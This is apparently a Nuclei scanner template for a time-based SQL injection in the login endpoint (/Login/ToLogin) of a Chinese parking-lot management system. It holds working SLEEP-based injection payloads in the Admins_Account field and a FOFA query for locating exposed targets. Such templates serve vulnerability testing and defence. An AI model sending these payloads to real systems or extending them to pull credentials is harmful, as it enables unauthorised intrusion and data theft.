http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /Login/ToLogin HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8

          Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(4)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
        - |
          POST /Login/ToLogin HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8

          Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(8)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
id: tingchechang-ToLogin-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="938984120"
        停车场后台管理系统 ToLogin 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 停车场后台管理系统 ToLogin SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486567&idx=1&sn=a25adfb68fac33e071b9640b2fb62c3b&chksm=c267b954f5103042f7025ba8c8ee4ce5d193e2eeba4fcae34e9f43f89c074f348f7b2b0ff030&token=1628549949&lang=zh_CN#rd
    severity: high
    tags: []
